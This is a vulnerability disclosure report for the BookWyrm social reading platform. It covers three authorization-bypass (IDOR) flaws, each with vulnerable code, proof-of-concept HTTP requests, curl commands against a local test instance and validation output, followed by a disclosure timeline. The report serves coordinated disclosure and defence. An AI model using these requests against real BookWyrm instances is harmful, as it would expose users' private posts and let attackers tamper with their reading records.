https://github.com/bookwyrm-social/bookwyrm

## Finding 1: Authenticated IDOR in EditStatus Exposes Private Review, Comment, and Quotation Content

Affected Versions: confirmed on commit 9ed5c41 (v0.8.5, current HEAD)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

CWE: CWE-639 -- Authorization Bypass Through User-Controlled Key

### Summary

The `EditStatus` view (`GET /edit/<status_id>`) retrieves a status object by its integer ID without applying any visibility or ownership check. Any authenticated user can access this endpoint with an arbitrary status ID and read the full content of another user's followers-only or direct-message reviews, comments, and quotations, bypassing the privacy setting that governs their visibility everywhere else in the application.

### Details

`bookwyrm/views/status.py`, lines 30-46:

```python
@method_decorator(login_required, name="dispatch")
class EditStatus(View):
    """the view for *posting*"""

    def get(self, request, status_id):
        """load the edit panel"""
        status = get_object_or_404(
            models.Status.objects.select_subclasses(), id=status_id
        )

        status_type = "reply" if status.reply_parent else status.status_type.lower()
        data = {
            "type": status_type,
            "book": getattr(status, "book", None),
            "draft": status,
        }
        return TemplateResponse(request, "compose.html", data)
```

The handler performs `get_object_or_404(..., id=status_id)` with no call to `status.raise_visible_to_user(request.user)` and no use of `Status.privacy_filter()`. The retrieved status object is then passed as `draft` into the `compose.html` template. That template includes `snippets/create_status/content_field.html`, which renders the raw status content directly into a textarea:

```
>{% firstof draft.raw_content draft.content '' %}</textarea>
```

Every other route that returns a status to the viewer -- the status page, the user feed, the inbox, the outbox -- goes through either `raise_visible_to_user` or `privacy_filter`. The edit endpoint does neither.

The `Status` model supports four privacy levels: `public`, `unlisted`, `followers`, and `direct`. Reviews, comments, and quotations set to `followers` (visible only to the author's approved followers) or `direct` (visible only to explicitly tagged recipients) are silently exposed in full through this endpoint to any authenticated session.

Status IDs are sequential integers. An attacker who can register or log in needs only to enumerate small integers to discover and read other users' private posts.

### PoC

The steps below use two accounts -- UserA (content owner) and UserB (non-follower) -- against the Docker test instance. Adapt cookie values and IDs as appropriate.

**Setup**

1. Register or log in as UserA. Create a Review, Comment, or Quotation on any book edition and set its privacy to "followers" or "direct". Note the integer ID shown in the URL when viewing the post. In this test UserA's followers-only review was assigned id 4 and their direct-message quotation was id 6.

2. Register or log in as UserB. Confirm UserB cannot see UserA's post via the normal status URL:

```
GET /user/usera/status/4
-> HTTP 404  (correct -- UserB is not a follower)
```

**Exploit**

From UserB's authenticated session, fetch the edit endpoint with UserA's status ID:

```
GET /edit/4
-> HTTP 200

Response body (abridged):
<textarea name="content" ...>This is a private review - followers only</textarea>
```

```
GET /edit/6
-> HTTP 200

Response body (abridged):
<textarea name="content" ...>Private thoughts on this quote</textarea>
```

The full text of both the restricted review and the direct-message quotation is returned in the textarea. The normal status URL continues to return 404 for UserB.

**Live-validation output**

```
UserB session: s3gutpu2fo4awdycza4la5zlewmqdcpe  (bookwyrmvr test instance)

$ curl -s -b "sessionid=<UserB>" http://localhost:9980/user/usera/status/4 -w "%{http_code}" -o /dev/null
404

$ curl -s -b "sessionid=<UserB>" http://localhost:9980/edit/4 | grep "This is a private review"
        >This is a private review - followers only</textarea>

$ curl -s -b "sessionid=<UserB>" http://localhost:9980/edit/6 | grep "Private thoughts"
        >Private thoughts on this quote</textarea>
```

Commit 9ed5c41, v0.8.5. No existing GHSAs cover this endpoint.

### Impact

Any authenticated user -- including users who have never interacted with the victim before -- can enumerate status IDs starting from 1 and read the full text of every followers-only and direct-message review, comment, and quotation on the instance. This covers all book reviews marked private or followers-only, book-progress comments, and quotations intended only for selected recipients.

The impact is limited to confidentiality; the POST path of the same endpoint calls `form.save(request)` which calls `raise_not_editable`, so writing the edited content back is blocked for non-owners.

Instances with open or low-barrier registration are most exposed. The privacy guarantee that BookWyrm documents for the "followers" and "direct" privacy settings is violated for all three rich-status types (Review, Comment, Quotation).


## Finding 2: Authenticated IDOR in Favorite/Unfavorite Allows Interaction with Private Statuses

Affected Versions: confirmed on commit 9ed5c41 (v0.8.5, current HEAD)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N

CWE: CWE-639 -- Authorization Bypass Through User-Controlled Key

### Summary

The Favorite, Unfavorite, Boost, and Unboost endpoints (`POST /favorite/<status_id>`, `POST /unfavorite/<status_id>`, etc.) retrieve a status by integer ID without applying the privacy filter or calling `raise_visible_to_user`. Any authenticated user can favorite or unfavorite a followers-only or direct-message status they have no right to see. This confirms the existence of private statuses to the attacker and notifies the victim that a non-authorized user has interacted with a post the victim believed was restricted.

### Details

`bookwyrm/views/interaction.py`, lines 15-51 (Favorite and Unfavorite):

```python
@method_decorator(login_required, name="dispatch")
class Favorite(View):
    def post(self, request, status_id):
        """create a like"""
        cache.delete(f"fav-{request.user.id}-{status_id}")
        status = models.Status.objects.get(id=status_id)
        try:
            models.Favorite.objects.create(status=status, user=request.user)
        except IntegrityError:
            return HttpResponseBadRequest()
        ...
        return redirect("/")

@method_decorator(login_required, name="dispatch")
class Unfavorite(View):
    def post(self, request, status_id):
        """unlike a status"""
        cache.delete(f"fav-{request.user.id}-{status_id}")
        status = models.Status.objects.get(id=status_id)
        ...
```

The `models.Status.objects.get(id=status_id)` call at line 22 and line 41 fetches any status by ID without checking whether the requesting user is permitted to see it. The same pattern applies to `Boost` (line 61) and `Unboost` (line 89).

By contrast, the `Status` view in `bookwyrm/views/feed.py` calls `status.raise_visible_to_user(request.user)` after fetching the object, and the privacy querysets in `bookwyrm/models/base_model.py` enforce visibility rules for followers-only and direct statuses correctly.

When a Favorite is created, the `ActivityMixin.save()` method broadcasts an AP Like activity to followers and creates a `Notification` for the status owner. BookWyrm's notification template includes a snippet of the status content next to the actor's name. As a result, the status owner is notified that a user who should not know about the private post has interacted with it.

### PoC

Using the same Docker test instance with UserA (content owner, no follower relationship to UserB) and UserB (attacker). Status id=1 is a followers-only generic status; status id=2 is a direct message. Both are owned by UserA.

**Confirm UserB cannot read the statuses:**

```
GET /user/usera/status/1   -> HTTP 404
GET /user/usera/status/2   -> HTTP 404
```

**Favorite both restricted statuses as UserB:**

```
POST /favorite/1   (with valid CSRF token and UserB session)
-> HTTP 302 to /

POST /favorite/2   (with valid CSRF token and UserB session)
-> HTTP 302 to /
```

**Verify the favorites were created and that UserA received notifications:**

Database check (via Django shell on test instance):

```
Favorite.objects.filter(user=userb):
  status_id=1  privacy=followers  content="This is a followers-only status by userA"
  status_id=2  privacy=direct     content="This is a direct message by userA"

Notification.objects.filter(user=usera):
  id=1  type=FAVORITE  status.id=1  privacy=followers  from_user=userb
  id=2  type=FAVORITE  status.id=2  privacy=direct     from_user=userb
```

UserA's notification page at /notifications shows:
"userb liked your status" with a snippet of the followers-only status content, and again for the direct message. Both interactions cross the intended privacy boundary.

Commit 9ed5c41, v0.8.5.

### Impact

An attacker who knows or enumerates a private status ID can interact with it as if they were an authorized viewer. The practical harms are:

1. Confirmation of private status existence via ID enumeration -- the 302 redirect on success distinguishes existing from non-existing IDs.
2. Notification side-channel -- the victim is alerted that an unauthorized user knows about a restricted post, which may expose sensitive context (e.g., a private book review or a direct message).
3. The illegitimate Favorite is persisted and broadcast via ActivityPub as a Like activity, attributing the interaction to the attacker's account on the fediverse.

The impact is lower than the EditStatus IDOR (finding 001) because content is not directly returned in the HTTP response. Boost is blocked for followers-only and direct statuses by the `boostable` property, which limits that specific vector.

## Finding 3: Authenticated IDOR in edit-readthrough Allows Tampering with Other Users' Reading Progress

Affected Versions: confirmed on commit 9ed5c41 (v0.8.5, current HEAD)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N

CWE: CWE-639 -- Authorization Bypass Through User-Controlled Key

### Summary

The `edit_readthrough` function (`POST /edit-readthrough`) updates reading progress records by integer ID without verifying that the requesting user owns the record. Any authenticated user can overwrite another user's reading start date, finish date, stopped date, and page progress for any book.

### Details

`bookwyrm/views/status.py`, lines 194-229:

```python
@login_required
@require_POST
def edit_readthrough(request):
    """can't use the form because the dates are too finnicky"""
    # TODO: remove this, it duplicates the code in the ReadThrough view
    readthrough = get_object_or_404(models.ReadThrough, id=request.POST.get("id"))

    if start_date := request.POST.get("start_date"):
        readthrough.start_date = load_date_in_user_tz_as_utc(start_date, request.user)

    if finish_date := request.POST.get("finish_date"):
        readthrough.finish_date = load_date_in_user_tz_as_utc(finish_date, request.user)

    progress = request.POST.get("progress")
    try:
        progress = int(progress)
        readthrough.progress = progress
    except (ValueError, TypeError):
        pass

    progress_mode = request.POST.get("progress_mode")
    try:
        progress_mode = models.ProgressMode(progress_mode)
        readthrough.progress_mode = progress_mode
    except ValueError:
        pass

    readthrough.save()
    readthrough.create_update()
    ...
```

The handler fetches a `ReadThrough` by its ID, applies all supplied date and progress fields, and saves. There is no check that `readthrough.user == request.user` and no call to `readthrough.raise_not_editable(request.user)`.

The companion `ReadThrough` class view at `bookwyrm/views/reading.py` (line 162) saves through the form, which calls `raise_not_editable` and correctly blocks non-owners. The standalone `edit_readthrough` function used for AJAX progress updates bypasses that check entirely.

The `ReadThrough` model inherits `raise_not_editable` from `BookWyrmModel` (`base_model.py`, line 117), which raises `PermissionDenied` for any non-owner. The function simply never calls it.

`ReadThrough` IDs are sequential integers. An attacker needs only a valid session and a target ID.

### PoC

Setup: UserA has a ReadThrough record with id=1, start_date=2026-01-01, progress=0.

**Tamper as UserB (no relationship to UserA):**

```
POST /edit-readthrough
Cookie: sessionid=<UserB session>
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=<valid>&id=1&start_date=2020-06-15&progress=42&progress_mode=PG
```

Response:
```
HTTP/1.1 302 Found
Location: http://localhost:9980/
```

Verify in the database (Django shell):
```
ReadThrough.objects.get(id=1):
  user = usera
  start_date = 2020-06-15 00:00:00+00:00
  progress = 42
```

UserA's reading record has been overwritten by UserB.

**Live-validation output (commit 9ed5c41, local Docker instance):**

```
Initial state:
ReadThrough id=1 user=usera start_date=2026-01-01 00:00:00 progress=0

POST /edit-readthrough  (UserB session, id=1, start_date=2020-06-15, progress=42)
<- HTTP 302 to /

After:
ReadThrough id=1 user=usera start_date=2020-06-15 00:00:00+00:00 progress=42
```

### Impact

Any authenticated user can silently alter another user's reading progress records. Affected fields include start date, finish date, stopped date, page number, and progress mode. Each save call also creates a `ProgressUpdate` history entry attributed to the victim, polluting their reading history. The damage affects annual reading goals (which depend on finish dates), reading statistics shown on the user's profile, and data exported in BookWyrm or Goodreads CSV format.


## Disclosure

 - 4 June 2026 - reported via email
 - 5 June 2026 - report accepted and fix to be released shortly
 - 6 July 2026 - final follow up
   
<img width="816" height="127" alt="image" src="https://github.com/user-attachments/assets/4398ebbf-53a0-4622-ad08-020d6b8096ff" />



